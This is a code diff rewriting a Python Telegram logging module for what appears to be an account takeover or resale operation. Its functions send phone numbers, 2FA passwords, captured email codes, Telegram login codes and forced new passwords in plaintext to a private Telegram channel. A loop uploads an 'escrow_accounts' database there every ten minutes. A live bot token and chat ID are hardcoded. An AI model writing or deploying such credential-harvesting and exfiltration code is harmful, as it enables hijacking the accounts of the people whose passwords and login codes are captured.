@@ -1,183 +1,310 @@
+"""
+Telegram Log Bot - Lightweight HTTP-based logger
+Sends all operation logs to a Telegram channel via Bot API.
+No polling, no conflicts. Works in dev and production.
+"""
+
 import asyncio
+import hashlib
 import os
 import shutil
 import json
+import aiohttp
 from datetime import datetime
 from typing import Optional
-from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
-from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
 
 BOT_TOKEN = "8194328185:AAGPwP8d6IjQINEFVA_CgLBXO_KRNlxNTck"
-ADMIN_IDS = [6213708507]
+CHAT_ID = -1003701131602
 CONFIG_FILE = "log_bot_config.json"
-DB_FILES = ["escrow_accounts.db", "test_accounts.db"]
-BACKUP_INTERVAL = 600
+DB_FILES = ["escrow_accounts.db"]
+BACKUP_INTERVAL = 600  # 10 minutes
+API_URL = f"https://api.telegram.org/bot{BOT_TOKEN}"
 
-log_settings = {"new_account": True, "password_set": True, "email_set": True, "email_code": True, "delivery": True, "error": True}
-log_channel_id = None
+_session: Optional[aiohttp.ClientSession] = None
+_last_db_hash: Optional[str] = None
 
-def load_config():
-    global log_channel_id, log_settings
+
+def _now():
+    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+
+
+def _load_config():
+    """Load channel ID from config file if exists."""
+    global CHAT_ID
     if os.path.exists(CONFIG_FILE):
-        with open(CONFIG_FILE, 'r') as f:
-            cfg = json.load(f)
-            log_channel_id = cfg.get("channel_id")
-            log_settings.update(cfg.get("settings", {}))
+        try:
+            with open(CONFIG_FILE, "r") as f:
+                cfg = json.load(f)
+                if cfg.get("channel_id"):
+                    CHAT_ID = cfg["channel_id"]
+        except:
+            pass
 
-def save_config():
-    with open(CONFIG_FILE, 'w') as f:
-        json.dump({"channel_id": log_channel_id, "settings": log_settings}, f)
 
-def is_admin(user_id: int) -> bool:
-    return user_id in ADMIN_IDS
+async def _get_session() -> aiohttp.ClientSession:
+    global _session
+    if _session is None or _session.closed:
+        _session = aiohttp.ClientSession()
+    return _session
 
-async def send_log(app: Application, log_type: str, message: str):
-    if not log_channel_id or not log_settings.get(log_type, True):
+
+async def send_log(message: str):
+    """Send a message to the Telegram log channel."""
+    if not CHAT_ID:
         return
     try:
-        await app.bot.send_message(chat_id=log_channel_id, text=message, parse_mode="HTML")
+        session = await _get_session()
+        await session.post(
+            f"{API_URL}/sendMessage",
+            json={"chat_id": CHAT_ID, "text": message, "parse_mode": "HTML"},
+            timeout=aiohttp.ClientTimeout(total=10),
+        )
     except Exception as e:
-        print(f"Error sending log: {e}")
+        print(f"[LogBot] Send failed: {e}")
 
-async def log_new_account(app: Application, phone: str, telegram_id: int, target_email: str):
-    msg = f"📥 <b>NEW ACCOUNT</b>\n\n📱 Phone: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n📧 Target Email:\n<code>{target_email}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    await send_log(app, "new_account", msg)
 
-async def log_password_set(app: Application, phone: str, telegram_id: int, password: str):
-    msg = f"🔐 <b>PASSWORD SET</b>\n\n📱 Phone: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n🔑 Password: <code>{password}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    await send_log(app, "password_set", msg)
-
-async def log_email_set(app: Application, phone: str, telegram_id: int, email: str):
-    msg = f"📧 <b>EMAIL CONFIRMED</b>\n\n📱 Phone: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n📧 Email: <code>{email}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    await send_log(app, "email_set", msg)
-
-async def log_email_code(app: Application, phone: str, telegram_id: int, code: str, email_hash: str):
-    msg = f"📨 <b>EMAIL CODE RECEIVED</b>\n\n📱 Phone: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n🔢 Code: <code>{code}</code>\n#️⃣ Hash: <code>{email_hash}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    await send_log(app, "email_code", msg)
-
-async def log_delivery(app: Application, phone: str, telegram_id: int, delivery_num: int):
-    msg = f"📦 <b>DELIVERED #{delivery_num}</b>\n\n📱 Phone: <code>{phone}</code>\n🆔 ID: <code>{telegram_id}</code>\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    await send_log(app, "delivery", msg)
-
-async def log_error(app: Application, action: str, phone: str, error: str):
-    msg = f"❌ <b>ERROR</b>\n\n🔧 Action: {action}\n📱 Phone: <code>{phone}</code>\n⚠️ Error: {error}\n\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
-    await send_log(app, "error", msg)
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id):
-        await update.message.reply_text("⛔ Unauthorized")
+async def send_document(file_path: str, caption: str = ""):
+    """Send a file (e.g. DB backup) to the log channel."""
+    if not CHAT_ID or not os.path.exists(file_path):
         return
-    kb = [[InlineKeyboardButton("⚙️ Log Settings", callback_data="settings")], [InlineKeyboardButton("📢 Set Channel", callback_data="set_channel")], [InlineKeyboardButton("💾 Backup Now", callback_data="backup_now")], [InlineKeyboardButton("📊 Stats", callback_data="stats")]]
-    await update.message.reply_text(f"👋 Log Bot\n\n📢 Channel: {log_channel_id or 'Not set'}", reply_markup=InlineKeyboardMarkup(kb))
+    try:
+        session = await _get_session()
+        data = aiohttp.FormData()
+        data.add_field("chat_id", str(CHAT_ID))
+        data.add_field("caption", caption)
+        data.add_field(
+            "document",
+            open(file_path, "rb"),
+            filename=os.path.basename(file_path),
+        )
+        await session.post(
+            f"{API_URL}/sendDocument",
+            data=data,
+            timeout=aiohttp.ClientTimeout(total=60),
+        )
+    except Exception as e:
+        print(f"[LogBot] Document send failed: {e}")
 
-async def callback_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    if not is_admin(query.from_user.id):
-        return
-    data = query.data
-    if data == "settings":
-        kb = []
-        for key, val in log_settings.items():
-            emoji = "✅" if val else "❌"
-            names = {"new_account": "New Account", "password_set": "Password", "email_set": "Email Set", "email_code": "Email Codes", "delivery": "Delivery", "error": "Errors"}
-            kb.append([InlineKeyboardButton(f"{emoji} {names.get(key, key)}", callback_data=f"toggle_{key}")])
-        kb.append([InlineKeyboardButton("🔙 Back", callback_data="back")])
-        await query.edit_message_text("⚙️ Log Settings:\n\nTap to toggle:", reply_markup=InlineKeyboardMarkup(kb))
-    elif data.startswith("toggle_"):
-        key = data.replace("toggle_", "")
-        log_settings[key] = not log_settings.get(key, True)
-        save_config()
-        kb = []
-        for k, v in log_settings.items():
-            emoji = "✅" if v else "❌"
-            names = {"new_account": "New Account", "password_set": "Password", "email_set": "Email Set", "email_code": "Email Codes", "delivery": "Delivery", "error": "Errors"}
-            kb.append([InlineKeyboardButton(f"{emoji} {names.get(k, k)}", callback_data=f"toggle_{k}")])
-        kb.append([InlineKeyboardButton("🔙 Back", callback_data="back")])
-        await query.edit_message_text("⚙️ Log Settings:\n\nTap to toggle:", reply_markup=InlineKeyboardMarkup(kb))
-    elif data == "set_channel":
-        context.user_data["waiting_channel"] = True
-        await query.edit_message_text("📢 Forward any message from your private channel to set it as log channel")
-    elif data == "backup_now":
-        await do_backup(context.application, query.message.chat_id)
-    elif data == "stats":
-        from backend.models.database import async_session, Account, AuthStatus
-        from sqlalchemy import select, func
-        async with async_session() as session:
-            total = await session.scalar(select(func.count()).select_from(Account))
-            completed = await session.scalar(select(func.count()).select_from(Account).where(Account.status == AuthStatus.COMPLETED))
-        await query.edit_message_text(f"📊 Stats:\n\n📱 Total Accounts: {total}\n✅ Completed: {completed}\n📢 Channel: {log_channel_id or 'Not set'}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="back")]]))
-    elif data == "back":
-        kb = [[InlineKeyboardButton("⚙️ Log Settings", callback_data="settings")], [InlineKeyboardButton("📢 Set Channel", callback_data="set_channel")], [InlineKeyboardButton("💾 Backup Now", callback_data="backup_now")], [InlineKeyboardButton("📊 Stats", callback_data="stats")]]
-        await query.edit_message_text(f"👋 Log Bot\n\n📢 Channel: {log_channel_id or 'Not set'}", reply_markup=InlineKeyboardMarkup(kb))
 
-async def handle_forwarded(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not is_admin(update.effective_user.id):
-        return
-    if context.user_data.get("waiting_channel") and update.message.forward_origin:
-        global log_channel_id
-        if hasattr(update.message.forward_origin, 'chat'):
-            log_channel_id = update.message.forward_origin.chat.id
-        elif hasattr(update.message.forward_origin, 'sender_chat'):
-            log_channel_id = update.message.forward_origin.sender_chat.id
-        else:
-            await update.message.reply_text("❌ Could not detect channel. Please forward a message from the channel.")
-            return
-        save_config()
-        context.user_data["waiting_channel"] = False
-        await update.message.reply_text(f"✅ Channel set: {log_channel_id}\n\nMake sure bot is admin in the channel!")
+# ===================== Log Event Functions =====================
 
-async def do_backup(app: Application, chat_id: int = None):
-    backup_dir = f"backups/{datetime.now().strftime('%Y%m%d_%H%M%S')}"
-    os.makedirs(backup_dir, exist_ok=True)
-    files_backed = []
+async def log_new_account(phone: str, telegram_id=None, target_email: str = ""):
+    await send_log(
+        f"📥 <b>NEW ACCOUNT</b>\n\n"
+        f"📱 Phone: <code>{phone}</code>\n"
+        f"🆔 TG ID: <code>{telegram_id or '-'}</code>\n"
+        f"📧 Email: <code>{target_email or '-'}</code>\n"
+        f"⏰ {_now()}"
+    )
+
+async def log_password_set(phone: str, telegram_id=None, password: str = ""):
+    await send_log(
+        f"🔐 <b>2FA PASSWORD SET</b>\n\n"
+        f"📱 Phone: <code>{phone}</code>\n"
+        f"🆔 TG ID: <code>{telegram_id or '-'}</code>\n"
+        f"🔑 Password: <code>{password}</code>\n"
+        f"⏰ {_now()}"
+    )
+
+async def log_email_set(phone: str, telegram_id=None, email: str = ""):
+    await send_log(
+        f"📧 <b>EMAIL CONFIRMED</b>\n\n"
+        f"📱 Phone: <code>{phone}</code>\n"
+        f"🆔 TG ID: <code>{telegram_id or '-'}</code>\n"
+        f"📧 Email: <code>{email}</code>\n"
+        f"⏰ {_now()}"
+    )
+
+async def log_email_code(email_hash: str, code: str, source: str = "webhook"):
+    await send_log(
+        f"📨 <b>EMAIL CODE CAPTURED</b>\n\n"
+        f"🔢 Code: <code>{code}</code>\n"
+        f"#️⃣ Hash: <code>{email_hash}</code>\n"
+        f"📡 Source: {source}\n"
+        f"⏰ {_now()}"
+    )
+
+async def log_code_fallback(phone: str, code: str):
+    await send_log(
+        f"📨 <b>CODE FROM TELEGRAM (777000)</b>\n\n"
+        f"📱 Phone: <code>{phone}</code>\n"
+        f"🔢 Code: <code>{code}</code>\n"
+        f"⏰ {_now()}"
+    )
+
+async def log_delivery(phone: str, telegram_id=None, delivery_num: int = 0):
+    await send_log(
+        f"📦 <b>DELIVERED #{delivery_num}</b>\n\n"
+        f"📱 Phone: <code>{phone}</code>\n"
+        f"🆔 TG ID: <code>{telegram_id or '-'}</code>\n"
+        f"⏰ {_now()}"
+    )
+
+async def log_delivery_code_sent(phone: str):
+    await send_log(
+        f"📤 <b>DELIVERY CODE SENT</b>\n\n"
+        f"📱 Phone: <code>{phone}</code>\n"
+        f"⏰ {_now()}"
+    )
+
+async def log_session_registered(phone: str, session_type: str = "pyrogram"):
+    await send_log(
+        f"🔗 <b>SESSION REGISTERED</b>\n\n"
+        f"📱 Phone: <code>{phone}</code>\n"
+        f"📦 Type: {session_type}\n"
+        f"⏰ {_now()}"
+    )
+
+async def log_security_check(phone: str, threat_level: str, red_flags: list = None, frozen: bool = False):
+    flags_txt = "\n".join([f"  🔴 {f}" for f in (red_flags or [])]) or "  None"
+    await send_log(
+        f"🛡️ <b>SECURITY CHECK</b>\n\n"
+        f"📱 Phone: <code>{phone}</code>\n"
+        f"⚠️ Threat: <b>{threat_level.upper()}</b>\n"
+        f"{'🧊 <b>FROZEN</b>' if frozen else ''}\n"
+        f"🚩 Red Flags:\n{flags_txt}\n"
+        f"⏰ {_now()}"
+    )
+
+async def log_admin_action(action: str, phone: str, details: str = ""):
+    await send_log(
+        f"⚙️ <b>ADMIN: {action.upper()}</b>\n\n"
+        f"📱 Phone: <code>{phone}</code>\n"
+        f"{f'📝 {details}' if details else ''}\n"
+        f"⏰ {_now()}"
+    )
+
+async def log_account_deleted(phone: str, telegram_id=None):
+    await send_log(
+        f"🗑️ <b>ACCOUNT DELETED</b>\n\n"
+        f"📱 Phone: <code>{phone}</code>\n"
+        f"🆔 TG ID: <code>{telegram_id or '-'}</code>\n"
+        f"⏰ {_now()}"
+    )
+
+async def log_session_terminated(phone: str, count: int = 0, scope: str = "all"):
+    await send_log(
+        f"🔌 <b>SESSIONS TERMINATED</b>\n\n"
+        f"📱 Phone: <code>{phone}</code>\n"
+        f"🔢 Count: {count}\n"
+        f"📋 Scope: {scope}\n"
+        f"⏰ {_now()}"
+    )
+
+async def log_force_secure(phone: str, new_password: str = ""):
+    await send_log(
+        f"🛡️ <b>FORCE SECURED</b>\n\n"
+        f"📱 Phone: <code>{phone}</code>\n"
+        f"🔑 New Pass: <code>{new_password or '?'}</code>\n"
+        f"⏰ {_now()}"
+    )
+
+async def log_error(action: str, phone: str = "", error: str = ""):
+    await send_log(
+        f"❌ <b>ERROR</b>\n\n"
+        f"🔧 Action: {action}\n"
+        f"📱 Phone: <code>{phone or '-'}</code>\n"
+        f"⚠️ {error}\n"
+        f"⏰ {_now()}"
+    )
+
+async def log_audit_result(phone: str, passed: bool, issues_count: int = 0):
+    emoji = "✅" if passed else "❌"
+    await send_log(
+        f"🔍 <b>AUDIT {'PASSED' if passed else 'FAILED'}</b> {emoji}\n\n"
+        f"📱 Phone: <code>{phone}</code>\n"
+        f"📋 Issues: {issues_count}\n"
+        f"⏰ {_now()}"
+    )
+
+async def log_startup():
+    await send_log(
+        f"🚀 <b>SERVER STARTED</b>\n\n"
+        f"⏰ {_now()}"
+    )
+
+async def log_shutdown():
+    await send_log(
+        f"🔴 <b>SERVER SHUTTING DOWN</b>\n\n"
+        f"⏰ {_now()}"
+    )
+
+
+# ===================== DB Backup =====================
+
+def _file_hash(path: str) -> str:
+    """Get MD5 hash of a file to detect changes."""
+    h = hashlib.md5()
+    try:
+        with open(path, "rb") as f:
+            for chunk in iter(lambda: f.read(8192), b""):
+                h.update(chunk)
+    except:
+        return ""
+    return h.hexdigest()
+
+
+async def do_backup(force: bool = False):
+    """Backup DB files to Telegram. Only sends if data changed (or force=True)."""
+    global _last_db_hash
     for db_file in DB_FILES:
-        if os.path.exists(db_file):
-            shutil.copy(db_file, f"{backup_dir}/{db_file}")
-            files_backed.append(db_file)
-    if log_channel_id:
-        for db_file in files_backed:
-            try:
-                with open(f"{backup_dir}/{db_file}", 'rb') as f:
-                    await app.bot.send_document(chat_id=log_channel_id, document=f, caption=f"💾 Backup: {db_file}\n⏰ {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
-            except:
-                pass
-    if chat_id:
-        await app.bot.send_message(chat_id=chat_id, text=f"✅ Backup created\n📁 {len(files_backed)} files")
+        if not os.path.exists(db_file):
+            continue
+        current_hash = _file_hash(db_file)
+        if not force and _last_db_hash and current_hash == _last_db_hash:
+            continue  # No changes, skip
+        _last_db_hash = current_hash
+        # Create local backup
+        backup_dir = "backups"
+        os.makedirs(backup_dir, exist_ok=True)
+        ts = datetime.now().strftime("%Y%m%d_%H%M%S")
+        backup_path = f"{backup_dir}/{ts}_{db_file}"
+        try:
+            shutil.copy(db_file, backup_path)
+        except:
+            continue
+        # Send to Telegram
+        await send_document(backup_path, f"💾 Backup: {db_file}\n⏰ {_now()}")
 
-async def backup_scheduler(app: Application):
+
+async def _backup_loop():
+    """Periodic backup loop - only sends if DB changed."""
     while True:
-        await asyncio.sleep(BACKUP_INTERVAL)
-        await do_backup(app)
+        try:
+            await asyncio.sleep(BACKUP_INTERVAL)
+            await do_backup()
+        except asyncio.CancelledError:
+            break
+        except Exception as e:
+            print(f"[LogBot] Backup error: {e}")
 
-_bot_app: Optional[Application] = None
 
-def get_bot_app() -> Optional[Application]:
-    return _bot_app
+# ===================== Init / Stop =====================
+
+_backup_task = None
 
 async def init_log_bot():
-    global _bot_app
-    load_config()
-    _bot_app = Application.builder().token(BOT_TOKEN).build()
-    _bot_app.add_handler(CommandHandler("start", start))
-    _bot_app.add_handler(CallbackQueryHandler(callback_handler))
-    _bot_app.add_handler(MessageHandler(filters.FORWARDED, handle_forwarded))
-    asyncio.create_task(backup_scheduler(_bot_app))
-    await _bot_app.initialize()
-    await _bot_app.start()
-    await _bot_app.updater.start_polling(drop_pending_updates=True)
-    print("Log bot started")
+    global _backup_task
+    _load_config()
+    _backup_task = asyncio.create_task(_backup_loop())
+    await log_startup()
+    print("[LogBot] Initialized (HTTP mode)")
+
 
 async def stop_log_bot():
-    global _bot_app
-    if _bot_app:
-        await _bot_app.updater.stop()
-        await _bot_app.stop()
-        await _bot_app.shutdown()
+    global _backup_task, _session
+    await log_shutdown()
+    if _backup_task:
+        _backup_task.cancel()
+        try:
+            await _backup_task
+        except asyncio.CancelledError:
+            pass
+    if _session and not _session.closed:
+        await _session.close()
+    print("[LogBot] Stopped")
 
-if __name__ == "__main__":
-    async def main():
-        await init_log_bot()
-        while True:
-            await asyncio.sleep(1)
-    asyncio.run(main())
+
+# Backward compatibility
+def get_bot_app():
+    return True  # Always truthy so old code paths execute
